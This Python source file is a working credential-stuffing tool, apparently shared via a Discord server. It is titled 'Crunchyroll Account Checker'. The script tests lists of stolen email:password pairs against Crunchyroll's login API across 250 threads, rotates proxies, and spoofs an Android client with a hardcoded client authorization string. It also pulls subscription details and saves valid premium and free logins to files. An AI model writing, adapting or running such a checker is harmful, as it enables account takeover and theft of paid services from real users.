import os, sys, json, time, random, string, ctypes, concurrent.futures
import requests
import colorama
import pystyle
import datetime
import uuid
import functools
from colorama import Fore, Style
from random import choice
from json import dumps
from pystyle import System, Colors, Colorate, Write
from concurrent import futures
from uuid import uuid4
from os import makedirs

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT
folder = "Checked"
if not os.path.exists(folder):
    os.makedirs(folder)
timenow = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
makedirs(f"Checked/{timenow}", exist_ok=True)
path = f"Checked/{timenow}"
invalid = 0
valid = 0
custom = 0
premium = 0
proxy_error = 0
accounts_processed = 0

start_time = time.time()
ctypes.windll.kernel32.SetConsoleTitleW(f'Crunchyroll Account Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Premium : {premium} | Proxy Error : {proxy_error} | .gg/spacegen')

def update_console_title():
    global valid, invalid, custom, premium, proxy_error, start_time, accounts_processed
    current_time = time.time()
    elapsed_time = current_time - start_time
    cpm = int((accounts_processed / elapsed_time) * 60)
    ctypes.windll.kernel32.SetConsoleTitleW(f'Crunchyroll Account Checker | Valid : {valid} | Invalid : {invalid} | Custom : {custom} | Premium : {premium} | Proxy Error : {proxy_error} | CPM : {cpm} | .gg/spacegen')

def my_ui():
    Write.Print(f"""
\t\t  ██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗██╗   ██╗██████╗  ██████╗ ██╗     ██╗          ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
\t\t ██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║╚██╗ ██╔╝██╔══██╗██╔═══██╗██║     ██║         ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
\t\t ██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║ ╚████╔╝ ██████╔╝██║   ██║██║     ██║         ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
\t\t ██║     ██╔══██╗██║   ██║██║╚██╗██║██║     ██╔══██║  ╚██╔╝  ██╔══██╗██║   ██║██║     ██║         ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
\t\t ╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║   ██║   ██║  ██║╚██████╔╝███████╗███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
\t\t  ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 
        > [TM] Made by JeremyOp™              
        > [?]  Discord: discord.gg/spacegen                                                                                    Version [0.1] <                                                                                                                                                        

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

""", Colors.yellow_to_red, interval=0.000)


my_ui()
time.sleep(3)
filename = "accounts.txt"
if not os.path.exists(filename):
    print(f"{red}No accounts.txt file found.")
    time.sleep(5)
    sys.exit()
filename = "proxies.txt"
if not os.path.exists(filename):
    print(f"{red}No proxies.txt file found.")
    time.sleep(5)
    sys.exit()
def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

def crunchy_checker(email, password):
    global invalid, valid, custom, premium, proxy_error, accounts_processed
    proxy_file = "proxies.txt"

    proxies = open(proxy_file).read().splitlines() if open(proxy_file).read().splitlines() else None

    session = requests.Session()

    if proxies:
        proxy = choice(proxies)
        session.proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
    try:
        guid = str(uuid4)

        url_token = "https://www.crunchyroll.com/auth/v1/token"
        headers_token = {
            "Host": "beta-api.crunchyroll.com",
            "Authorization": "Basic bm12anNoZmtueW14eGtnN2ZiaDk6WllJVnJCV1VQYmNYRHRiRDIyVlNMYTZiNFdRb3Mzelg=",
            "Etp-Anonymous-Id": guid,
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Crunchyroll/3.54.0 Android/12 okhttp/4.12.0"
        }
        data_token = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": guid
        }
        response_token = session.post(url_token, headers=headers_token, data=data_token)

        response_token_json = response_token.json()

        if "code" in response_token_json and response_token_json[
            "code"] == "auth.obtain_access_token.invalid_credentials":
            invalid += 1
            accounts_processed += 1
            time_rn = get_time_rn()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}-{gray}) {pretty}Invalid {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
            update_console_title()
            return
        else:
            access_token = response_token_json["access_token"]
            country = response_token_json["country"]
            cf_cookie = response_token.cookies.get("__cf_bm")
            url_user = "https://beta-api.crunchyroll.com/accounts/v1/me"
            headers_user = {
                "Host": "beta-api.crunchyroll.com",
                "Authorization": f"Bearer {access_token}",
                "etp-anonymous-id": guid,
                "accept-encoding": "gzip",
                "user-agent": "Crunchyroll/3.54.0 Android/12 okhttp/4.12.0",
                "cookie": f"__cf_bm={cf_cookie}"
            }

            response_user = session.get(url_user, headers=headers_user)
            user_details = response_user.json()
            external_id = user_details["external_id"]
            created = user_details["created"]
            email_verified = user_details["email_verified"]

            url_subscriptions = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products"
            headers_subscriptions = {
                "Authorization": f"Bearer {access_token}"
            }
            response_subscriptions = session.get(url_subscriptions, headers=headers_subscriptions)

            subscription_details = response_subscriptions.json()
            if "items" in subscription_details and len(subscription_details["items"]) > 0:
                subscription_item = subscription_details["items"][0]
                product_name = subscription_item["product"]["name"]
                plan_sku = subscription_item["product"]["sku"]
                is_active_free_trial = subscription_item["active_free_trial"]
                is_subscribable = subscription_item["product"].get("is_subscribable", False)
                total = subscription_details["total"]
                is_cancelled = subscription_item.get("is_cancelled", False)
                valid += 1
                accounts_processed += 1
                update_console_title()
                time_rn = get_time_rn()
                print(
                    f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}Valid {gray}|{pink} {email}{gray}:{pink}{password}{gray} | {green}Subscription: True{reset} | {green}Plan Name: {product_name}{reset} | {green}Plan SKU: {plan_sku}{reset} | {green}Is Active Free Trial: {is_active_free_trial}{reset} | {green}Is Cancelled: {is_cancelled}{reset} | {green}Email Verified: {email_verified}{reset} | {green}Created Date: {created}{reset}")
                with open(f"{path}/good_crunchyroll_premium.txt", "a+", encoding='utf-8') as premium_file:
                    premium_file.write(f"{email}:{password} | Subscription: True | Plan Name: {product_name} | Plan SKU: {plan_sku} | Is Active Free Trial: {is_active_free_trial} | Is Subscribable:{is_subscribable} | Is Cancelled: {is_cancelled} | Email Verified: {email_verified} | Created Date: {created}" + "\n")
                premium += 1
                accounts_processed += 1
                update_console_title()
                return
            else:
                custom += 1
                accounts_processed += 1
                time_rn = get_time_rn()
                print(
                    f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({lightblue}~{gray}) {pretty}Custom {gray}|{pink} {email}{gray}:{pink}{password}{gray}")
                update_console_title()
                folder = "Checked"
                if not os.path.exists(folder):
                    os.makedirs(folder)
                with open(f"{path}/custom_crunchyroll.txt", "a+", encoding='utf-8') as crunchyroll_penis2:
                    crunchyroll_penis2.write(f"{email}:{password} | Plan: Free Account | Email Verified: {email_verified} | Created Date: {created}" + "\n")
                return
    except:
        proxy_error += 1
        update_console_title()

accounts = []

with open('accounts.txt', 'r') as file:
    for line in file:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':')
            accounts.append((email.strip(), password.strip()))
if not accounts:
    print(f"{cyan}The accounts file is empty.")
    exit()
def process_account(email, password):
    crunchy_checker(email, password)

max_threads = 250

with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
    futures = [executor.submit(process_account, email, password) for email, password in accounts]
    concurrent.futures.wait(futures)

print(f"\n\n[{cyan}>{reset}] {pretty}Checked {green}Successfully {reset}")
print(f"[{cyan}>{reset}] {pretty}Saved to \Checked\\{timenow}\good_crunchyroll_premium.txt\"")
input(f"[{cyan}>{reset}] {pretty}Press To Exit")
